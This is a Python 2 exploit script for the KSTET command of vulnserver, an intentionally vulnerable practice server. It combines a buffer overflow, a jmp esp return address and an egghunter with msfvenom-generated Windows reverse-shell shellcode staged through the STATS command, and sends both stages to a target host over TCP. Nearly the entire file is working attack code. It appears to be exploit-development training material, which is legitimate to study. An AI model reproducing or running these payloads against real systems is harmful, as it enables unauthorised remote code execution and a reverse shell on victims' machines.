#!/usr/bin/python

import socket
import sys
import subprocess
import time

host = "192.168.160.106"
port = 9999

#########################################
## WriTTen by:van6uard
## vulnserver KSTET Exploit
## jmp esp 62501205

## known bad characters \x00
#########################################

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

payload = ""
payload += "A"*4
payload += egghunter
payload += "A"*(69-32-4)        # filler
payload += "\x05\x12\x50\x62"   # jmp esp
payload += "\x66\x83\xc0\x07"   # add ax, 0x7
payload += "\xff\xd0"           # call eax
payload += "B"*(200-69-4-4-2)

buf = 'KSTET  '
buf += payload

################


# egg = w00tw00t
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=33791 -f python -b "\x00" EXITFUNC=thread -v shellcode
shellcode = ""
shellcode += "STATS "
shellcode += "w00tw00t"
shellcode += "\xba\xa4\x71\xfa\x2e\xdb\xd2\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\xf4"
shellcode += "\x7f\x18\xdb\x08\x97\x5e\x24\xf0\x68\x3f\xac\x15"
shellcode += "\x59\x7f\xca\x5e\xca\x4f\x98\x32\xe7\x24\xcc\xa6"
shellcode += "\x7c\x48\xd9\xc9\x35\xe7\x3f\xe4\xc6\x54\x03\x67"
shellcode += "\x45\xa7\x50\x47\x74\x68\xa5\x86\xb1\x95\x44\xda"
shellcode += "\x6a\xd1\xfb\xca\x1f\xaf\xc7\x61\x53\x21\x40\x96"
shellcode += "\x24\x40\x61\x09\x3e\x1b\xa1\xa8\x93\x17\xe8\xb2"
shellcode += "\xf0\x12\xa2\x49\xc2\xe9\x35\x9b\x1a\x11\x99\xe2"
shellcode += "\x92\xe0\xe3\x23\x14\x1b\x96\x5d\x66\xa6\xa1\x9a"
shellcode += "\x14\x7c\x27\x38\xbe\xf7\x9f\xe4\x3e\xdb\x46\x6f"
shellcode += "\x4c\x90\x0d\x37\x51\x27\xc1\x4c\x6d\xac\xe4\x82"
shellcode += "\xe7\xf6\xc2\x06\xa3\xad\x6b\x1f\x09\x03\x93\x7f"
shellcode += "\xf2\xfc\x31\xf4\x1f\xe8\x4b\x57\x48\xdd\x61\x67"
shellcode += "\x88\x49\xf1\x14\xba\xd6\xa9\xb2\xf6\x9f\x77\x45"
shellcode += "\xf8\xb5\xc0\xd9\x07\x36\x31\xf0\xc3\x62\x61\x6a"
shellcode += "\xe5\x0a\xea\x6a\x0a\xdf\xbd\x3a\xa4\xb0\x7d\xea"
shellcode += "\x04\x61\x16\xe0\x8a\x5e\x06\x0b\x41\xf7\xad\xf6"
shellcode += "\x02\x38\x99\x58\xba\xd0\xd8\x98\xb8\xde\x54\x7e"
shellcode += "\xd4\x30\x31\x29\x41\xa8\x18\xa1\xf0\x35\xb7\xcc"
shellcode += "\x33\xbd\x34\x31\xfd\x36\x30\x21\x6a\xb7\x0f\x1b"
shellcode += "\x3d\xc8\xa5\x33\xa1\x5b\x22\xc3\xac\x47\xfd\x94"
shellcode += "\xf9\xb6\xf4\x70\x14\xe0\xae\x66\xe5\x74\x88\x22"
shellcode += "\x32\x45\x17\xab\xb7\xf1\x33\xbb\x01\xf9\x7f\xef"
shellcode += "\xdd\xac\x29\x59\x98\x06\x98\x33\x72\xf4\x72\xd3"
shellcode += "\x03\x36\x45\xa5\x0b\x13\x33\x49\xbd\xca\x02\x76"
shellcode += "\x72\x9b\x82\x0f\x6e\x3b\x6c\xda\x2a\x5b\x8f\xce"
shellcode += "\x46\xf4\x16\x9b\xea\x99\xa8\x76\x28\xa4\x2a\x72"
shellcode += "\xd1\x53\x32\xf7\xd4\x18\xf4\xe4\xa4\x31\x91\x0a"
shellcode += "\x1a\x31\xb0"

try: 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    s.connect((host, port))
    s.send(shellcode)
    print s.recv(1024)
    print "[+] Evil 1st stage shellcode sent..."
    s.close()
    
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print c.recv(1024)
    print "[+] Evil 2nd stage shellcode sent..."
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()

